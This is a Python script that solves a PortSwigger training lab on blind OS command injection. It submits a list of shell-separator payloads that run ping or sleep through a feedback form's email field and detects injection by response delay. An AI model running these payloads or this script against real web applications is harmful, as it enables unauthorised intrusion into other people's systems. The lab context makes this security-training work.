#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Blind OS command injection with time delays".

The feedback form passes the email field into a shell command. The command's
output is never shown (blind), so we prove injection by timing: inject a
command that pauses for ~10 seconds and watch the response take that long.

Lab: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import argparse
import re
import sys

import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 30   # higher than usual: the injected command delays ~10s

# A response slower than the baseline by at least this many seconds means the
# injected delay command actually ran.
DELAY_THRESHOLD = 5

# A spread of blind command-injection payloads: different shell separators
# and command-substitution forms, plus Unix and Windows delay commands. The
# script tries each until one measurably delays the response, then stops.
PAYLOADS = [
    "x||ping -c 10 127.0.0.1||",     # || (OR) + Unix ping  -- PortSwigger's answer
    "x& ping -c 10 127.0.0.1 &",     # &  (background) + Unix ping
    "x; ping -c 10 127.0.0.1 ;",     # ;  (separator) + Unix ping
    "x| ping -c 10 127.0.0.1",       # |  (pipe) + Unix ping
    "x&& ping -c 10 127.0.0.1",      # && (AND) + Unix ping
    "x`ping -c 10 127.0.0.1`",       # `...` backtick command substitution
    "x$(ping -c 10 127.0.0.1)",      # $(...) command substitution
    "x|| sleep 10||",                # sleep instead of ping (Unix/bash)
    "x|| ping -n 10 127.0.0.1||",    # Windows ping uses -n instead of -c
]


def fetch(path, method="GET", data=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def get_csrf():
    """Fetch the feedback page and pull the hidden CSRF token out of the form."""
    resp = fetch("feedback")
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    return match.group(1) if match else None


def submit_feedback(email):
    """Fetch a fresh CSRF token, then submit the feedback form."""
    csrf = get_csrf()
    if not csrf:
        return None
    return fetch("feedback/submit", method="POST", data={
        "csrf": csrf,
        "name": "test",
        "email": email,
        "subject": "test",
        "message": "test",
    })


def check_command_injection():
    # Each submission re-fetches the CSRF token, since a real form's token may
    # rotate or expire on use. This lab's token happens to be static, but
    # re-fetching keeps the script correct for the general case.

    # Baseline: how long does a normal submission take?
    resp = submit_feedback("test@test.com")
    if resp is None:
        report("OS command injection", False, "couldn't find CSRF token")
        return
    baseline = resp.elapsed.total_seconds()
    print(f"[*] Baseline response: {baseline:.1f}s")

    print("[*] Trying command-injection payloads...")
    for payload in PAYLOADS:
        try:
            resp = submit_feedback(payload)
            if resp is None:
                continue
            elapsed = resp.elapsed.total_seconds()
        except requests.exceptions.RequestException:
            continue

        if elapsed - baseline > DELAY_THRESHOLD:
            report("OS command injection", True,
                   f"delayed {elapsed:.1f}s with payload: {payload}")
            return

    report("OS command injection", False, "no payload caused a delay")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Detect blind OS command injection via response timing (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_command_injection()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()